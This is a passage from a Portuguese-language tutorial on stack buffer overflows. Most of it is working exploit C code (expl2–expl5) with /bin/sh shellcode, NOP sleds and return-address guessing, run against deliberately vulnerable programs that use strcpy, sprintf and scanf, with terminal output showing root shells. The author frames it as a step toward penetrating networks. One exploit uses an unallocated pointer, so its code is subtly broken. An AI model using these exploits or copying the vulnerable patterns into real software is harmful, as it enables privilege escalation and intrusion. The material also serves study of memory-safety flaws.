+estou escrevendo aqui, mas os problemas envolvendo overflows sao varios,
+e muitas solucoes nao foram divulgadas ainda.Nao me refiro aqui, a
+protecao, seguranca, ateh porque nao eh minha area, estou me referindo
+a ataques mais complexos, que pouquissimas pessoas tem acesso a eles.
+Consequentemente, isto confere-lhes poderes bem evoluidos, no sentido
+de poder facilmente penetrar numa rede.Acho que por uma questao etica,
+devemos sim expor o que sabemos, para que nao haja um monopolio da
+informacao.Voce amigo Newbie, estude e rale, pois sei que pode chegar
+longe, aonde ninguem ainda chegou, mas lembre-se: Voce  sem outros,
+eu afirmo novamente,"sem outros", voce jamais chegaria ou chegarah aonde
+deseja!!!!Uma mao ajuda a outra, amigo!!
+
+----------------------------------
+5 - PROBLEMAS ENVOLVENDO EXPLOITS |
+----------------------------------
+
+Problemas sao um cotidiano em nossas vidas.De qualquer forma, nao
+poderia ser diferente envolvendo algo que muitos consideram tao
+complexo como escrita de exploits para se aproveitar de um buffer
+overflow.Eu sou um exemplo pratico disso tudo, com falta de recursos,
+eu tenho penado nessa area.Mas, como quase tudo eh possivel(Lembre-se
+do filme "MATRIX" :)!), nao devemos desanimar e sim levar como um
+desafio maior e gratificante.O exploit citado acima possui grandes
+limitacoes, de modo que os exemplos que se seguem abaixo, sao para
+tentar expandir e melhorar o uso dele, espero que em breve, voce
+mesmo possa estar implementando solucoes inovadoras para os problemas
+relacionados a essa area.Mas a vida continua...
+
+Veremos um exploit bastante parecido com esse aih de cima, mas com
+algumas mudancas para implementar melhor as coisas.Iremos usar um
+artificio dentro do codigo do nosso exploit para que ele nos de a
+posicao do SP(Stack Pointer).
+
+O artificio segue o esquema do programa abaixo:
+
+-------------------------- pega_sp.c ------------------------------
+
+/* Programa para pegar Stack Pointer */
+#include <stdio.h>
+#include <stdlib.h>
+
+unsigned long pega_sp(void){
+__asm__("movl %esp,%eax");
+}
+
+void main(){
+printf("Eis o que estamos procurando:  0x%x \n",pega_sp());
+}
+
+-----------------------------------------------------------------
+
+Compilando ele e executando normalmente, teremos:
+
+[localhost:/]$ gcc -o pega_sp pega_sp.c
+[localhost:/]$ ./pega_sp
+Eis o que estamos procurando:  0xbffffa28
+[localhost:/]$
+
+
+Como podemos perfeitamente ver, existe uma diferenca entre o SP achado
+via gdb e o SP achado via esse programa.Essa diferenca pode perfeitamente
+ser compensada no acrescimento ou decrescimo de offsets na linha de
+comando em busca do real endereco de retorno.Como o SP eh variavel(muda
+de maquina para maquina, de programa p/ programa), este codigo eh
+bastante util aonde nao se tem acesso a captura do SP facilmente, como
+por exemplo, em exploits remotos ou em redes aonde nao podemos compilar
+um programa.
+
+Inserindo esse codigo no nosso exploit, teremos entao um novo esquema com
+a retirada do SP definido(o que pegamos via gdb).Vejamos como fica:
+
+------------------------------ expl2.c ----------------------------------
+/* Segundo Exemplo de exploit para sobrescrever primeiro programa
+   bugado do tutorial sobre overflows.
+   Se utitiliza do metodo de pegar o SP(Stack Pointer) via codigo
+   inserido no proprio exploit abaixo.
+   Desenvolvido por Nash Leon.
+*/
+
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+/* Definimos o NOP(0x90) e o Tamanho do buffer(+ ou - 100 bytes maior
+   que o que nos queremos sobrescrever */
+
+#define NOP        0x90
+#define TAMANHO     612
+
+/* Aqui entra nosso artificio para tentarmos pegar a posicao de SP */
+
+unsigned long pega_sp(void){
+__asm__("movl %esp, %eax");
+}
+
+/* Nosso shellcode padrao */
+
+char shellcode[] =
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec"
+  "\x5d\xc3";
+
+int main(int argc, char *argv[])
+{
+char buffer[TAMANHO];
+int i, offset = 0;
+long retaddr;
+
+if(argc > 1) offset = atoi(argv[1]);
+
+/* Para pegarmos o real return address(endereco de retorno) manipulando
+   nosso esquema para pegar SP com diminuicao de offsets.Voce poderia
+   colocar para somar, mas nesse caso, com esse esquema, eh melhor
+   colocarmos com diminuicao,para nao chutarmos offsets negativos */
+
+retaddr = pega_sp() - offset;
+
+/* Colocamos buffer no endereco de retorno */
+
+for (i=0;i<TAMANHO;i+=4)
+   *(long *)&buffer[i] = retaddr;
+
+/* Enchemos uma parte do buffer com NOP's */
+
+for (i=0;i<(TAMANHO-strlen(shellcode)-100);i++)
+   *(buffer+i) = NOP;
+
+/* Copiamos shellcode sobre buffer */
+
+memcpy(buffer+i,shellcode,strlen(shellcode));
+
+/* Finalmente executamos o programa */
+
+execl("./bug1","bug1",buffer,0);
+}
+-----------------------------------------------------------------------
+
+Em seguida compilamos e executamos o dito cujo.
+
+[localhost:/]$ gcc -o expl2 expl2.c
+[localhost:/]$ ./expl2
+Voce digitou ...
+....
+bash# exit
+exit
+
+Bingo!!!:)..logo de primeira aqui! Caso nao tenha conseguido, chute
+offsets de 50 em 50.
+
+Como voce pode ver aih, ele eh bem mais interessante do que o esquema
+anterior.Mas vale uma observacao:O que mais influenciou para que este
+exploit funcionasse bem desse jeito nao foi exatamente o artificio
+para pegarmos o endereco de SP, e sim o tamanho do buffer que estamos
+manipulando, no nosso caso 612.Escolhemos esse numero porque tinhamos
+conhecimento de com quantos bytes em media o buffer estourava, recorda
+aih do teste inicial lah do inicio para vermos se o programa bug1 era
+vulneravel a um overflow! Eh aconselhavel que antes de escrever um
+exploit, voce tenha ideia de quando mais ou menos ocorre o overflow,
+mas se isso nao for possivel, voce pode perfeitamente alterar os
+exploits acima para que recebam dados(tamanho do buffer) pela propria
+linha de comando, mas aih o exploit nao ficaria tao bem otimizado.
+Em todo caso abaixo segue um exemplo do mesmo exploit acima, mas
+desta vez recebendo o tamanho do buffer pela linha de comando(argv[1]).
+Vejamos:
+
+---------------------------- expl3.c ----------------------------------
+/* Terceiro exemplo de exploit para primeiro programa bugado(bug1).
+   Nesse exemplo a inovacao eh por conta do recebimento do tamanho
+   do buffer via linha de comando(argv[1]).
+   Desenvolvido por Nash Leon.
+*/
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+/* Boa e velha instrucao NOP em linux */
+
+#define NOP     0x90
+
+/* Para pegarmos o Stack Pointer */
+
+unsigned long pega_sp(void){
+__asm__("movl %esp, %eax");
+}
+
+/* Testaremos dessa ver com esse shellcode, mas voce pode perfeitamente
+   usar o anterior ou qualquer um que tiver ou desejar */
+
+char shellcode[] =
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+
+int main(int argc, char *argv[])
+{
+char *buffer;
+long retaddr;
+int i ,tamanho = 0, offset = 0;
+
+if(argc < 2){
+printf("Exploit Exemplo 3 do tutorial sobre overflows!!\n");
+printf("http://unsekurity.virtualave.net/\n");
+printf("Uso: %s <tamanho_do_buffer> <offset>\n",argv[0]);
+printf("Obs:Digite o tamanho do buffer!!\n\n");
+exit(0);
+}
+if (argc > 1) {
+tamanho = atoi(argv[1]);
+}
+if (argc > 2) {
+offset = atoi(argv[2]);
+}
+
+if(!(buffer = malloc(tamanho))){
+fprintf(stderr,"Nao pode alocar mamoria!!\n");
+exit(1);
+}
+
+retaddr = pega_sp() - offset;
+
+/* Colocamos buffer no endereco de retorno */
+
+for (i=0;i<tamanho;i+=4)
+   *(long *)&buffer[i] = retaddr;
+
+/* Enchemos uma parte do buffer com NOP's */
+
+for (i=0;i<(tamanho-strlen(shellcode)-100);i++)
+   *(buffer+i) = NOP;
+
+/* Copiamos shellcode sobre buffer */
+
+memcpy(buffer+i,shellcode,strlen(shellcode));
+
+/* Finalmente executamos o programa */
+
+execl("./bug1","bug1",buffer,0);
+}
+-----------------------------------------------------------------
+
+Agora nos compilamos e executamos nosso exploit:
+
+[localhost:/]$ gcc -o expl3 expl3.c
+[localhost:/]$ ./e3
+Exploit Exemplo 3 do tutorial sobre overflows!!
+http://unsekurity.virtualave.net/
+Uso: ./e3 <tamanho_do_buffer> <offset>
+Obs:Digite o tamanho do buffer!!
+
+[localhost:/]$ ./e3 200
+Voce digitou 1UØ@I
+èÜÿÿÿ/bin/shúÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿ú
+ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!
+
+[localhost:/]$ ./e3 400
+Voce digitou 1UØ@I
+èÜÿÿÿ/bin/shúÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿ú
+ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ
+ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!
+
+[localhost:/]$ ./e3 500
+Voce digitou 1UØ@I
+èÜÿÿÿ/bin/shúÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿ú
+ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ
+ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úúÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿ú
+úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!ÿ¿úÿ¿úÿ¿úÿ
+úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!ÿ¿úÿ¿úÿ¿ú
+úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!ÿ¿ÿ¿!!
+
+[localhost:/]$ ./e3 600
+Voce digitou 1UØ@I
+èÜÿÿÿ/bin/shúÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿ú
+ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ
+ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úúÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿ú
+úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!ÿ¿úÿ¿úÿ¿úÿ
+úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!ÿ¿úÿ¿úÿ¿ú
+úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!ÿ¿ÿ¿!!
+bash#id
+uid=1000 gid=100(users) groups=100(users) euid=0(root) egid=0(root)
+bash# exit
+exit
+
+:)..Como podemos ver foi facil, chutamos poucos, de 100 em 100, para
+nao escrever mais linhas...esse texto jah estah grande demais, mas
+de qualquer forma vai um conselho.Quando receber aquela velha mensagem
+que disse no inicio, "Segmentation fault" , saiba que voce jah estourou
+o buffer.Entao tente diminuir o tamanho do buffer ateh que voce nao receba
+mais essa mensagem aih voce terah ideia mais ou menos de onde de fato
+ocorre o overflow.De posse dessa ideia eh soh mandar brasa.
+
+Veremos agora mais um exploit para nosso programa bugado, soh que
+usaremos um artificio que optimizarah nosso exploit, fazendo com que
+diminua ainda mais o nosso trabalho.Iremos manipular mais dados para
+que o endereco de retorno aponte mais precisamente para aonde nos
+queremos.Vejamos:
+
+------------------------------expl4.c------------------------------
+/* QUARTO EXEMPLO DE EXPLOIT PARA PRIMEIRO PROGRAMA BUGADO.
+   SE UTILIZADA DE ALINHAMENTO EM BUSCA DE MELHORAR O
+   APONTAMENTO DO ENDERECO DE RETORNO PARA NOSSO CODIGO */
+
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+#define NOP     0x90
+
+/* Aqui nos definimos o alinhamento, jah para voce ir se
+  acostumando..:).. */
+
+#define ALIGN      0
+
+/* Pegamos o Stack Pointer */
+
+unsigned long pega_sp(void){
+__asm__("movl %esp, %eax");
+}
+
+char shellcode[] =
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+
+int main(int argc, char *argv[])
+{
+char *buffer;
+long retaddr;
+int i ,tamanho = 0, offset = 0;
+
+if(argc < 2){
+printf("Exploit Exemplo 4 do tutorial sobre overflows!!\n");
+printf("http://unsekurity.virtualave.net/\n");
+printf("Uso: %s <tamanho_do_buffer> <offset>\n",argv[0]);
+printf("Obs:Digite o tamanho do buffer!!\n\n");
+exit(0);
+}
+if (argc > 1) {
+tamanho = atoi(argv[1]);
+}
+if (argc > 2) {
+offset = atoi(argv[2]);
+}
+
+if(!(buffer = malloc(tamanho))){
+fprintf(stderr,"Nao pode alocar mamoria!!\n");
+exit(1);
+}
+
+retaddr = pega_sp() - offset;
+
+/* Colocamos buffer no endereco de retorno usando o artificio
+   de deslocamento de bits para a direita, no intuito de agilizar
+   ainda mais nosso processo.Para voce entender bem o que significa
+   isso aih, vejamos:
+   n = 2; onde 2 em binario eh 10;
+   n << 4; agora n terah representacao binaria igual a 100000
+                                                    10 + 4 zeros.
+   E a operacao logica & equivale a && soh que eh usada em operacoes
+   logica bit-a-bit.
+  */
+
+for (i=0;i<tamanho;i+=4)
+
+       {
+                buffer[i+ALIGN]=(retaddr&0x000000ff);
+                buffer[i+ALIGN+1]=(retaddr&0x0000ff00)>>8;
+                buffer[i+ALIGN+2]=(retaddr&0x00ff0000)>>16;
+                buffer[i+ALIGN+3]=(retaddr&0xff000000)>>24;
+        }
+
+/* Enchemos uma parte do buffer com NOP's */
+
+for (i=0;i<(tamanho-strlen(shellcode)-100);i++)
+   *(buffer+i) = NOP;
+
+/* Copiamos shellcode sobre buffer */
+
+memcpy(buffer+i,shellcode,strlen(shellcode));
+
+/* Finalmente executamos o programa */
+
+execl("./bug1","bug1",buffer,0);
+}
+-----------------------------------------------------------------
+
+Compilamos ele e em seguida testamos.
+
+[localhost:/]$ gcc -o expl4 expl4.c
+[localhost:/]$ ./expl4
+Exploit Exemplo 4 do tutorial sobre overflows!!
+http://unsekurity.virtualave.net/
+Uso: ./e5 <tamanho_do_buffer> <offset>
+Obs:Digite o tamanho do buffer!!
+
+[localhost:/]$ ./expl 520
+Voce digitou....
+¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿ú¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿ú¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿ú
+¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿ú¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿ú¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿ú
+/bin/shúÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿ú
+bash#exit
+exit
+
+YES!!!!!!:) Como podemos ver, esse esquema eh muito eficiente quando
+temos nocao de onde ocorre o overflow, ele explora mesmo muitos chutes
+de buffers sem precisar de offsets, voce pode testar com varios, vah
+testando chutando de 10 em 10, de 517 ateh lah por 600, 610.Voce pode
+ateh mesmo chutar bem mais o tamanho do buffer, mas aih poderah ter que
+chutar offsets, e quanto mais longe disso, melhor!!!
+
+Aos poucos estamos conseguindo solucionar varios problemas e
+aperfeicoando ainda mais a escrita de nossos exploits.Mas podem
+surgir ainda mais e mais problemas,nao se desanime, se aprendeu tudo
+aih em cima o que segue eh soh completo, voce estarah se munindo cada
+vez mais, e breve estarah capacitado p/ enfrentar muitas situcoes que
+podem dificultar nossos buffers overflows.Nos exemplos citados acima,
+os buffers(bloco de memoria), onde eram guardadas as variaveis no
+programa bugado possuiam o tamanho de 512 bytes.Isto eh considerado
+grande.Logico, dependendo da ocasiao, tem programas com bem mais do que
+isso, mas eu me refiro que num buffer deste tamanho, nos nao temos
+problemas em inserir nosso codigo, mas e se o buffer for menor, se for
+bem pequeno?
+
+Veremos agora um exemplo de um pequeno buffer.Existem casos em que os
+buffers sao tao pequenos que nosso shellcode nao cabem neles, entao
+a primeira vista parece um enorme empecilho, sem duvida que eh, mas
+ha uma solucao!No mundo da informatica, ainda mais nesse onde os
+fucadores trabalham, pesquisam e etc, nao existe a palavra impossivel,
+a teoria de hoje pode ser a pratica de amanha.
+
+Para podermos sobrescrever um buffer desse tipo, devemos entao colocar
+nossos dados(shellcode,nops) num lugar e depois fazer  com que o
+endereco de retorno(return address) aponte p/ esse lugar, aonde estao os
+nossos dados.O lugar onde podemos colocar nossos dados eh conhecido como
+"variavel environment"(ao redor, ambiente, por perto), o pessoal que
+meche a um pouco de tempo em linux sabe do que estou falando.De qualquer
+forma, quando ocorrer o overflow, nos colocaremos o endereco dessa
+variavel sobre o return address, fazendo com que nosso codigo seja
+executado.
+As variaveis environment sao armazenadas no topo do Stack quando o
+programa eh iniciado, qualquer modificacao pela funcao setenv() - que
+serve para mudar ou adicionar uma variavel environment - eh entao
+alocada lah(no topo do stack). Apos a inicializacao o stack ficaria
+parecido mais ou menos com isso:
+
+
+<strings><argv aponta p/>NULL<envp aponta p/>NULL<argc><argv><envp>
+
+
+
+Veremos entao um novo exemplo de programa bugado, soh que com um
+pequeno buffer.Vejamos
+
+------------------------------------------------------------------
+/* SEGUNDO EXEMPLO DE PROGRAMA BUGADO.
+   PROGRAMA BUGADO COM PEQUENO BUFFER */
+
+#include <stdio.h>
+#include <string.h>
+
+#define TAMANHO      100
+
+main(int argc, char *argv[])
+{
+char nick[TAMANHO];
+char *digitado;
+if(argc < 2){
+printf("Programa bugado 2!!\n");
+printf("Uso: %s <seu_nick>\n",argv[0]);
+exit(0);
+}
+digitado = argv[1];
+strcpy(nick,digitado);
+if(!strcmp(nick,"hacko")){
+printf("Seja bem vindo mestre!!\n");
+return 0;
+}
+else{
+printf("Fora daqui!!Voce eh Newbie!!\n");
+printf("Somente hackos tem acesso na hora certa!!\n");
+return 0;
+}
+}
+-----------------------------------------------------------------
+
+Compile ele normalmente: gcc -o bug2 bug2.c
+
+Como voce pode ver, ele possui apenas 100 bytes de tamanho no buffer,
+poderia ateh possuir menos para nossos propositos educacionais, e
+voce pode se deparar com buffers menores por aih, mas trabalharemos em
+cima desse com 100 bytes para facilitar mais, lembrando novamente o
+que eu disse em outros tutoriais:
+"SABENDO FAZER UM, O QUE TE IMPEDE DE FAZER TODOS?"
+
+Abaixo segue o exploit para esse tipo de programa bugado:
+
+----------------------------- expl5.c -------------------------------
+/* Exploit para Segundo Programa Bugado.
+   Ele irah criar uma variavel environment para
+   sobrescrever um buffer pequeno */
+
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+/* Definimos o tamanho do buffer padrao, o tamanho do buffer
+   aqui do nosso exploit nao precisa ser pequeno, o que eh
+   aconselhavel eh definirmos o tamanho do buffer da variavel
+   environment proximo ao do buffer bugado, por isso amigo,
+   eh bom ter uma ideia, antes de exploitar um programa bugado,
+   do tamanho do buffer que recebe dados, tente a velha forca
+   bruta.Alinhamento, Offset e Nop, voce jah sabe. */
+
+#define TAMANHO_BUFFER        500
+#define NOP                  0x90
+#define OFFSET_PADRAO           0
+#define ALIGN                   0
+
+/* Aqui entra a definicao do tamanho padrao do buffer onde ficarah
+   nossa variavel environment, tente coincidir com o tamanho do buffer
+   bugado, se nao for possivel, chute atraves da linha de comando. */
+
+#define TAMANHO_VENV          100
+
+unsigned long pega_sp(void){
+__asm__("movl %esp, %eax");
+}
+
+char shellcode[] =
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+int main(int argc, char *argv[])
+{
+char *buffer, *var_env;
+long retaddr;
+int i ,tamanho = TAMANHO_BUFFER, offset = OFFSET_PADRAO;
+int tam_venv = TAMANHO_VENV ;
+
+if (argc > 1) {
+tamanho = atoi(argv[1]);
+}
+if (argc > 2) {
+offset = atoi(argv[2]);
+}
+if(argc > 3){
+tam_venv = atoi(argv[3]);
+}
+
+if(!(buffer = malloc(tamanho))){
+fprintf(stderr,"Nao pode alocar mamoria!!\n");
+exit(1);
+}
+
+/* Pegando o Endereco de Retorno */
+
+retaddr = pega_sp() - offset;
+
+/* Colocamos buffer no endereco de retorno */
+
+for (i=0;i<tamanho;i+=4)
+       {
+                buffer[i+ALIGN]=(retaddr&0x000000ff);
+                buffer[i+ALIGN+1]=(retaddr&0x0000ff00)>>8;
+                buffer[i+ALIGN+2]=(retaddr&0x00ff0000)>>16;
+                buffer[i+ALIGN+3]=(retaddr&0xff000000)>>24;
+        }
+
+
+
+/* Enchemos uma parte do buffer com NOP's
+   Como pode notar, manipulamos nosso buffer em cima
+   do tamanho da variavel environment, se ligue, se for
+   chutar tamanhos, nao chute muito distantes um do outro
+*/
+
+for (i=0;i<(tam_venv-strlen(shellcode));i++)
+   *(buffer+i) = NOP;
+
+memcpy(buffer+i,shellcode,strlen(shellcode));
+
+/* Setamos a Variavel Environment */
+
+var_env[tam_venv -1] = '\0';
+
+memcpy(var_env,"EGG=",4);
+putenv(var_env);
+
+/* Executamos o programa bugado */
+
+execl("./bug2","bug2",buffer,0);
+
+}
+---------------------------------------------------------------
+
+Compilamos ele normalmente e em seguida mandamos brasa:
+
+[localhost:/]$ gcc -o expl5 expl5.c
+[localhost:/]$ ./expl5 500 0 100
+Fora daqui .....
+úÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿú
+úÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿ
+úÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿ!!Voce eh Newbie!!
+Somente hackos tem acesso na hora certa!!
+Segmentation fault
+[localhost:/]$ ./expl5 400 0 200
+Fora daqui .....
+úÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿú
+úÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿ
+úÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿ!!Voce eh Newbie!!
+Somente hackos tem acesso na hora certa!!
+bash# exit
+exit
+
+:)...Como pode ver, tudo eh possivel amigo.Voce pode tentar, chutando
+o tamanho do buffer p/ nosso exploit de 360 a 410, mais ou menos, sem
+necessitar de offsets.Jah o tamanho do buffer da variavel Environmente,
+fica proximo ao tamanho do buffer do programa bugado, algo entre 90 e
+104, tente chegar bem proximo do tamanho do buffer bugado, aih voce
+terah que manipular somente o tamanho do buffer do exploit(argv[1]).
+
+Bem amigos, creio que isso eh o suficiente para se exploitar funcoes
+que recebem dados da linha de comando, como nos dois exemplos acima,
+onde a funcao strcpy() manipulava dados recebidos diretamente pela
+linha de comando.Sabemos que nao sao somente estas as funcoes que nao
+checam o tamanho dos dados recebidos e sua relacao com o tamanho do
+buffer para as variaveis, sao varias, e mais lah embaixo voce verah
+algumas explicadas brevemente, mas para enfatizar que voce estah apto
+a explorar falhas nas funcoes que nao checam o tamanho dos dados
+recebidos pela linha de comando, colocaremos mais um programa bugado,
+soh que com outra funcao que nao checa, a funcao sprintf.
+
+/* PROGRAMA BUGADO 3, SPRINTF() */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#define    TAMANHO   512
+
+main(int argc, char *argv[]){
+char *hacko;
+char buf_bugado[TAMANHO];
+
+if(argc < 2){
+printf("Programa bugado 3!!\n");
+printf("Uso: %s string\n",argv[0]);
+exit(0);
+}
+hacko = argv[1];
+sprintf(buf_bugado,"%s",hacko);
+printf("Seja bem vindo %s!\n",buf_bugado);
+return 0;
+}
+
+
+Voce pode usar o mesmo exploit otimizado usado para sobrescrever o
+primeiro programa bugado,o exploit de numero 4 para esse programa acima
+e conseguir exploita-lo.Aqui no meu caso, chutei o tamanho do buffer de
+520 a 620, conseguindo exploitar tranquilamente.Eh dificil hj em dia se
+achar codigos contendo este tipo de bug(funcao sprintf() usada deste
+modo), voce pode ver claramente que o uso dela nao eh util, pois eh
+mais facil achar strcpy() fazendo o que sprintf() fez acima.Mas eh bem
+capaz de voce achar num programa sprintf() sendo usado da seguinte forma:
+
+sprintf(buf_bugado,"Seja bem vindo %s!\n",hacko);
+printf(buf_bugado);
+
+
+Aih a coisa complica um pouco.Nao vou avancar muito, pois pretendo, se
+necessario, escrever uma continuacao para este tutorial, mas antes deve
+vir um material sobre IPC(InterProcess Comunication), que um dos
+membros do Unsekurity Team estah processando..:).
+Com IPC fica mais facil interagir com funcoes que nao recebem dados
+da linha de comando, e consequentemente exploita-las.Eh possivel que
+ainda nao exista material divulgado sobre este tipo de exploitacao em
+linux,mas que ela eh possivel, isso eh fato!!!Voce pode ver abaixo
+este programa bugado:
+
+/* QUARTO PROGRAMA BUGADO PARA TUTORIAL SOBRE OVERFLOWS
+   PROGRAMA BUGADO COM A FUNCAO SCANF().
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+
+main(){
+char nome[12];
+printf("Digite seu nome:");
+scanf("%s",&nome);
+printf("Seja bem vindo %s!\n",nome);
+}
+
+
+Voce pode ver claramente que a funcao scanf() acima nao checa dados
+recebidos.Mas neste exemplo nao empurraremos dados pela linha de comando,
+isso eh um pequeno problema que o pessoal que manja de IPC jah sabe
+resolver, mas um grande problema.Soh encontrei um documento que falasse
+algo sobre exploitacao de um buffer via IPC na internet, mesmo assim,
+nada claro.Lembrando que quando falo exploitacao via IPC, nao tou me
+referindo a buffer remotos nao, via socket, tou me referindo ao programa
+acima.Talvez exista ateh um metodo melhor que isto,nao sei.Teste para ver
+se esse programa eh bugado, usando o gdb, como no esquema lah do comeco.
+Assim que sair o tutorial sobre IPC, a gente avanca mais nesse ponto.
+Quanto ao codigo de sprintf() acima, nao faz-se necessario IPC para
+exploitar ele, soh necessita de uma manha para que o endereco de retorno
+caia numa parte do buffer que execute nossa shell.Vou deixar para depois
+tambem, isso aqui jah tah grande mais, e tah meio avancado demais.Fica
+aih os conceitos, espero quando publicar a continuacao deste txt voce
+nao precisar mais dos dados que nele estarao referentes a Stack Overflows,
+pois espero que esteja jah dominando boa parte dessa tecnica.
+
+Encerramos por aqui, essa fase inicial sobre Stack Overflows, veremos
+agora algo parecido com Stack Overflows, mas que eh muito util hoje em
+dia, o Heap Overflow.
+
+
+-------------------------
+6 - O HEAP - A NOVA ERA? |
+-------------------------
+
+Como podemos ver acima,estah mais do que provado que a regiao
+denominada Stack pode ser usada atraves de estouro de buffer para
+execucao de codigos arbitrarios ou mais conhecidos como shellcodes
+(codigos de shell).Quando a pratica de Stack Overflows foi sendo cada
+vez mais difundida, o time da seguranca tratou de tentar contra-atacar.
+Pensaram e estudaram ateh encontrar uma "forma" de dificultar a execucao
+de codigo arbitrario via Stack Overflow.Criaram um programa capaz de
+manter vigilancia no Stack e impedir a execucao de codigo arbitrario,
+sao os chamados Stack Guards.Nao sao tao eficientes, mas determinados
+tipos de vulnerabilidades nao podem ser mais exploitadas via Stack
+Overflows.No momento tambem sao poucos os programas deste tipo, e eu
